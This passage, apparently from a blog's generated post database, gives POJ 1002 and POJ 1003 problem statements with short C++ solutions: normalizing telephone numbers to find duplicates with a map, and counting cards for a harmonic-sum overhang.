have the same standard form. (They dial the same number.) </p>\n<p>Your company is compiling a directory of telephone numbers from local businesses. As part of the quality control process you want to check that no two (or more) businesses in the directory have the same telephone number. </p>\n<p>Input</p>\n<p>The input will consist of one case. The first line of the input specifies the number of telephone numbers in the directory (up to 100,000) as a positive integer alone on the line. The remaining lines list the telephone numbers in the directory, with each number alone on a line. Each telephone number consists of a string composed of decimal digits, uppercase letters (excluding Q and Z) and hyphens. Exactly seven of the characters in the string will be digits or letters.<br>Output</p>\n<p>Generate a line of output for each telephone number that appears more than once in any form. The line should give the telephone number in standard form, followed by a space, followed by the number of times the telephone number appears in the directory. Arrange the output lines by telephone number in ascending lexicographical order. If there are no duplicates in the input print the line: </p>\n<p>No duplicates. </p>\n<p>Sample Input<br>12<br>4873279<br>ITS-EASY<br>888-4567<br>3-10-10-10<br>888-GLOP<br>TUT-GLOP<br>967-11-11<br>310-GINO<br>F101010<br>888-1200<br>-4-8-7-3-2-7-9-<br>487-3279</p>\n<p>Sample Output<br> 310-1010 2<br>487-3279 4<br>888-4567 3</p>\n</blockquote>\n<p>我用了<code>map</code>，纯偷懒的方法。因为<code>map</code>的内部是红黑树的实现，所以速度还是比较快的。<br>看了别人的方法，还有其他的实现：</p>\n<ol>\n<li>快排</li>\n<li>哈希表</li>\n<li><strong>Trie树（前缀树/字典树）</strong>，这个应该是最快的方法</li>\n</ol>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;vector&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stack&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;queue&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;map&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">1e5</span> + <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">map</span>&lt;<span class=\"built_in\">string</span> , <span class=\"keyword\">int</span>&gt;tel;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> n;</div><div class=\"line\"><span class=\"keyword\">int</span> flag = <span class=\"number\">0</span>;</div><div class=\"line\"><span class=\"built_in\">string</span> a;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">char</span> <span class=\"title\">get</span><span class=\"params\">(<span class=\"keyword\">char</span> c)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (c &gt;= <span class=\"string\">'A'</span> &amp;&amp; c &lt;= <span class=\"string\">'P'</span>)</div><div class=\"line\">\t\t<span class=\"keyword\">return</span> (c - <span class=\"string\">'A'</span>) / <span class=\"number\">3</span> + <span class=\"number\">2</span> + <span class=\"string\">'0'</span>;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (c &gt;= <span class=\"string\">'R'</span> &amp;&amp; c &lt;= <span class=\"string\">'Y'</span>)</div><div class=\"line\">\t\t<span class=\"keyword\">return</span> (c - <span class=\"string\">'A'</span> - <span class=\"number\">1</span>) / <span class=\"number\">3</span> + <span class=\"number\">2</span> + <span class=\"string\">'0'</span>;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (c &gt;= <span class=\"string\">'0'</span> &amp;&amp; c &lt;= <span class=\"string\">'9'</span>)</div><div class=\"line\">\t\t<span class=\"keyword\">return</span> c ;</div><div class=\"line\">\t<span class=\"keyword\">return</span> c;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;n);</div><div class=\"line\">\tgetchar();</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n;)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\ta = <span class=\"string\">\"\"</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>;;)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"keyword\">char</span> x = getchar();</div><div class=\"line\">\t\t\t<span class=\"keyword\">char</span> y = get(x);</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (j == <span class=\"number\">3</span>)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\ta += <span class=\"string\">'-'</span>;</div><div class=\"line\">\t\t\t\tj++;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (y == <span class=\"string\">'-'</span>)</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">continue</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (y == <span class=\"string\">'\\n'</span>)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\ti++;</div><div class=\"line\">\t\t\t\ttel[a]++;</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\ta += y;</div><div class=\"line\">\t\t\tj++;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">map</span>&lt;<span class=\"built_in\">string</span>, <span class=\"keyword\">int</span>&gt;::iterator it;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (it = tel.begin(); it != tel.end(); it++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (it-&gt;second &gt; <span class=\"number\">1</span>)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\tflag = <span class=\"number\">1</span>;</div><div class=\"line\">\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; it-&gt;first &lt;&lt; <span class=\"string\">' '</span> &lt;&lt; it-&gt;second &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\t<span class=\"keyword\">else</span></div><div class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (!flag)</div><div class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"No duplicates.\\n\"</span>;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>","excerpt":"","more":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>Businesses like to have memorable telephone numbers. One way to make a telephone number memorable is to have it spell a memorable word or phrase. For example, you can call the University of Waterloo by dialing the memorable TUT-GLOP. Sometimes only part of the number is used to spell a word. When you get back to your hotel tonight you can order a pizza from Gino’s by dialing 310-GINO. Another way to make a telephone number memorable is to group the digits in a memorable way. You could order your pizza from Pizza Hut by calling their “three tens’’ number 3-10-10-10. </p>\n<p>The standard form of a telephone number is seven decimal digits with a hyphen between the third and fourth digits (e.g. 888-1200). The keypad of a phone supplies the mapping of letters to numbers, as follows: </p>\n<p>A, B, and C map to 2<br>D, E, and F map to 3<br>G, H, and I map to 4<br>J, K, and L map to 5<br>M, N, and O map to 6<br>P, R, and S map to 7<br>T, U, and V map to 8<br>W, X, and Y map to 9 </p>\n<p>There is no mapping for Q or Z. Hyphens are not dialed, and can be added and removed as necessary. The standard form of TUT-GLOP is 888-4567, the standard form of 310-GINO is 310-4466, and the standard form of 3-10-10-10 is 310-1010. </p>\n<p>Two telephone numbers are equivalent if they have the same standard form. (They dial the same number.) </p>\n<p>Your company is compiling a directory of telephone numbers from local businesses. As part of the quality control process you want to check that no two (or more) businesses in the directory have the same telephone number. </p>\n<p>Input</p>\n<p>The input will consist of one case. The first line of the input specifies the number of telephone numbers in the directory (up to 100,000) as a positive integer alone on the line. The remaining lines list the telephone numbers in the directory, with each number alone on a line. Each telephone number consists of a string composed of decimal digits, uppercase letters (excluding Q and Z) and hyphens. Exactly seven of the characters in the string will be digits or letters.<br>Output</p>\n<p>Generate a line of output for each telephone number that appears more than once in any form. The line should give the telephone number in standard form, followed by a space, followed by the number of times the telephone number appears in the directory. Arrange the output lines by telephone number in ascending lexicographical order. If there are no duplicates in the input print the line: </p>\n<p>No duplicates. </p>\n<p>Sample Input<br>12<br>4873279<br>ITS-EASY<br>888-4567<br>3-10-10-10<br>888-GLOP<br>TUT-GLOP<br>967-11-11<br>310-GINO<br>F101010<br>888-1200<br>-4-8-7-3-2-7-9-<br>487-3279</p>\n<p>Sample Output<br> 310-1010 2<br>487-3279 4<br>888-4567 3</p>\n</blockquote>\n<p>我用了<code>map</code>，纯偷懒的方法。因为<code>map</code>的内部是红黑树的实现，所以速度还是比较快的。<br>看了别人的方法，还有其他的实现：</p>\n<ol>\n<li>快排</li>\n<li>哈希表</li>\n<li><strong>Trie树（前缀树/字典树）</strong>，这个应该是最快的方法</li>\n</ol>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;vector&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stack&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;queue&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;map&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">1e5</span> + <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">map</span>&lt;<span class=\"built_in\">string</span> , <span class=\"keyword\">int</span>&gt;tel;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> n;</div><div class=\"line\"><span class=\"keyword\">int</span> flag = <span class=\"number\">0</span>;</div><div class=\"line\"><span class=\"built_in\">string</span> a;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">char</span> <span class=\"title\">get</span><span class=\"params\">(<span class=\"keyword\">char</span> c)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (c &gt;= <span class=\"string\">'A'</span> &amp;&amp; c &lt;= <span class=\"string\">'P'</span>)</div><div class=\"line\">\t\t<span class=\"keyword\">return</span> (c - <span class=\"string\">'A'</span>) / <span class=\"number\">3</span> + <span class=\"number\">2</span> + <span class=\"string\">'0'</span>;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (c &gt;= <span class=\"string\">'R'</span> &amp;&amp; c &lt;= <span class=\"string\">'Y'</span>)</div><div class=\"line\">\t\t<span class=\"keyword\">return</span> (c - <span class=\"string\">'A'</span> - <span class=\"number\">1</span>) / <span class=\"number\">3</span> + <span class=\"number\">2</span> + <span class=\"string\">'0'</span>;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (c &gt;= <span class=\"string\">'0'</span> &amp;&amp; c &lt;= <span class=\"string\">'9'</span>)</div><div class=\"line\">\t\t<span class=\"keyword\">return</span> c ;</div><div class=\"line\">\t<span class=\"keyword\">return</span> c;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;n);</div><div class=\"line\">\tgetchar();</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n;)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\ta = <span class=\"string\">\"\"</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>;;)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"keyword\">char</span> x = getchar();</div><div class=\"line\">\t\t\t<span class=\"keyword\">char</span> y = get(x);</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (j == <span class=\"number\">3</span>)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\ta += <span class=\"string\">'-'</span>;</div><div class=\"line\">\t\t\t\tj++;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (y == <span class=\"string\">'-'</span>)</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">continue</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (y == <span class=\"string\">'\\n'</span>)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\ti++;</div><div class=\"line\">\t\t\t\ttel[a]++;</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\ta += y;</div><div class=\"line\">\t\t\tj++;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">map</span>&lt;<span class=\"built_in\">string</span>, <span class=\"keyword\">int</span>&gt;::iterator it;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (it = tel.begin(); it != tel.end(); it++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (it-&gt;second &gt; <span class=\"number\">1</span>)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\tflag = <span class=\"number\">1</span>;</div><div class=\"line\">\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; it-&gt;first &lt;&lt; <span class=\"string\">' '</span> &lt;&lt; it-&gt;second &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\t<span class=\"keyword\">else</span></div><div class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (!flag)</div><div class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"No duplicates.\\n\"</span>;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>"},{"title":"POJ 1003","date":"2017-03-13T08:57:52.000Z","_content":"\n## Description\n\n> How far can you make a stack of cards overhang a table? If you have one card, you can create a maximum overhang of half a card length. (We're assuming that the cards must be perpendicular to the table.) With two cards you can make the top card overhang the bottom one by half a card length, and the bottom one overhang the table by a third of a card length, for a total maximum overhang of 1/2 + 1/3 = 5/6 card lengths. In general you can make n cards overhang by 1/2 + 1/3 + 1/4 + ... + 1/(n + 1) card lengths, where the top card overhangs the second by 1/2, the second overhangs tha third by 1/3, the third overhangs the fourth by 1/4, etc., and the bottom card overhangs the table by 1/(n + 1). This is illustrated in the figure below.\n\n> ![hangover.jpg](POJ-1003/hangover.jpg)\n\n> Input\nThe input consists of one or more test cases, followed by a line containing the number 0.00 that signals the end of the input. Each test case is a single line containing a positive floating-point number c whose value is at least 0.01 and at most 5.20; c will contain exactly three digits.\n\n> Output\nFor each test case, output the minimum number of cards necessary to achieve an overhang of at least c card lengths. Use the exact output format shown in the examples.\n\n> Sample Input\n1.00\n3.71\n0.04\n5.19\n0.00\n\n> Sample Output\n3 card(s)\n61 card(s)\n1 card(s)\n273 card(s)\n\n简单题\n\n## Code\n\n```\n#include<cstdio>\n\nusing namespace std;\ntypedef long long LL;\n\nfloat n;\nint i = 2;\nfloat sum = 0;\n\nint main()\n{\n\tscanf(\"%f\", &n);\n\twhile (n != 0)\n\t{\n\t\tsum = 0;\n\t\ti = 2;\n\t\twhile (sum < n)\n\t\t{\n\t\t\tsum += 1.0 / (float)i;\n\t\t\ti++;\n\t\t}\n\t\tprintf(\"%d card(s)\\n\", i - 2);\n\t\tscanf(\"%f\", &n);\n\t}\n\treturn 0;\n}\n```","source":"_posts/POJ-1003.md","raw":"---\ntitle: POJ 1003\ntags:\n  - POJ\ncategories: []\ndate: 2017-03-13 16:57:52\n---\n\n## Description\n\n> How far can you make a stack of cards overhang a table? If you have one card, you can create a maximum overhang of half a card length. (We're assuming that the cards must be perpendicular to the table.) With two cards you can make the top card overhang the bottom one by half a card length, and the bottom one overhang the table by a third of a card length, for a total maximum overhang of 1/2 + 1/3 = 5/6 card lengths. In general you can make n cards overhang by 1/2 + 1/3 + 1/4 + ... + 1/(n + 1) card lengths, where the top card overhangs the second by 1/2, the second overhangs tha third by 1/3, the third overhangs the fourth by 1/4, etc., and the bottom card overhangs the table by 1/(n + 1). This is illustrated in the figure below.\n\n> ![hangover.jpg](POJ-1003/hangover.jpg)\n\n> Input\nThe input consists of one or more test cases, followed by a line containing the number 0.00 that signals the end of the input. Each test case is a single line containing a positive floating-point number c whose value is at least 0.01 and at most 5.20; c will contain exactly three digits.\n\n> Output\nFor each test case, output the minimum number of cards necessary to achieve an overhang of at least c card lengths. Use the exact output format shown in the examples.\n\n> Sample Input\n1.00\n3.71\n0.04\n5.19\n0.00\n\n> Sample Output\n3 card(s)\n61 card(s)\n1 card(s)\n273 card(s)\n\n简单题\n\n## Code\n\n```\n#include<cstdio>\n\nusing namespace std;\ntypedef long long LL;\n\nfloat n;\nint i = 2;\nfloat sum = 0;\n\nint main()\n{\n\tscanf(\"%f\", &n);\n\twhile (n != 0)\n\t{\n\t\tsum = 0;\n\t\ti = 2;\n\t\twhile (sum < n)\n\t\t{\n\t\t\tsum += 1.0 / (float)i;\n\t\t\ti++;\n\t\t}\n\t\tprintf(\"%d card(s)\\n\", i - 2);\n\t\tscanf(\"%f\", &n);\n\t}\n\treturn 0;\n}\n```","slug":"POJ-1003","published":1,"updated":"2017-03-13T09:05:26.274Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k1b0034hv187si7wvza","content":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>How far can you make a stack of cards overhang a table? If you have one card, you can create a maximum overhang of half a card length. (We’re assuming that the cards must be perpendicular to the table.) With two cards you can make the top card overhang the bottom one by half a card length, and the bottom one overhang the table by a third of a card length, for a total maximum overhang of 1/2 + 1/3 = 5/6 card lengths. In general you can make n cards overhang by 1/2 + 1/3 + 1/4 + … + 1/(n + 1) card lengths, where the top card overhangs the second by 1/2, the second overhangs tha third by 1/3, the third overhangs the fourth by 1/4, etc., and the bottom card overhangs the table by 1/(n + 1). This is illustrated in the figure below.</p>\n<p><img src=\"/2017/03/13/POJ-1003/hangover.jpg\" alt=\"hangover.jpg\"></p>\n<p>Input<br>The input consists of one or more test cases, followed by a line containing the number 0.00 that signals the end of the input. Each test case is a single line containing a positive floating-point number c whose value is at least 0.01 and at most 5.20; c will contain exactly three digits.</p>\n<p>Output<br>For each test case, output the minimum number of cards necessary to achieve an overhang of at least c card lengths. Use the exact output format shown in the examples.</p>\n<p>Sample Input<br>1.00<br>3.71<br>0.04<br>5.19<br>0.00</p>\n<p>Sample Output<br>3 card(s)<br>61 card(s)<br>1 card(s)<br>273 card(s)</p>\n</blockquote>\n<p>简单题</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">float</span> n;</div><div class=\"line\"><span class=\"keyword\">int</span> i = <span class=\"number\">2</span>;</div><div class=\"line\"><span class=\"keyword\">float</span> sum = <span class=\"number\">0</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%f\"</span>, &amp;n);</div><div class=\"line\">\t<span class=\"keyword\">while</span> (n != <span class=\"number\">0</span>)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tsum = <span class=\"number\">0</span>;</div><div class=\"line\">\t\ti = <span class=\"number\">2</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">while</span> (sum &lt; n)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\tsum += <span class=\"number\">1.0</span> / (<span class=\"keyword\">float</span>)i;</div><div class=\"line\">\t\t\ti++;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d card(s)\\n\"</span>, i - <span class=\"number\">2</span>);</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%f\"</span>, &amp;n);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>","excerpt":"","more":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>How far can you make a stack of cards overhang a table? If you have one card, you can create a maximum overhang of half a card length. (We’re assuming that the cards must be perpendicular to the table.) With two cards you can make the top card overhang the bottom one by half a card length, and the bottom one overhang the table by a third of a card length, for a total maximum overhang of 1/2 + 1/3 = 5/6 card lengths. In general you can make n cards overhang by 1/2 + 1/3 + 1/4 + … + 1/(n + 1) card lengths, where the top card overhangs the second by 1/2, the second overhangs tha third by 1/3, the third overhangs the fourth by 1/4, etc., and the bottom card overhangs the table by 1/(n + 1). This is illustrated in the figure below.</p>\n<p><img src=\"/2017/03/13/POJ-1003/hangover.jpg\" alt=\"hangover.jpg\"></p>\n<p>Input<br>The input consists of one or more test cases, followed by a line containing the number 0.00 that signals the end of the input. Each test case is a single line containing a positive floating-point number c whose value is at least 0.01 and at most 5.20; c will contain exactly three digits.</p>\n<p>Output<br>For each test case, output the minimum number of cards necessary to achieve an overhang of at least c card lengths. Use the exact output format shown in the examples.</p>\n<p>Sample Input<br>1.00<br>3.71<br>0.04<br>5.19<br>0.00</p>\n<p>Sample Output<br>3 card(s)<br>61 card(s)<br>1 card(s)<br>273 card(s)</p>\n</blockquote>\n<p>简单题</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div 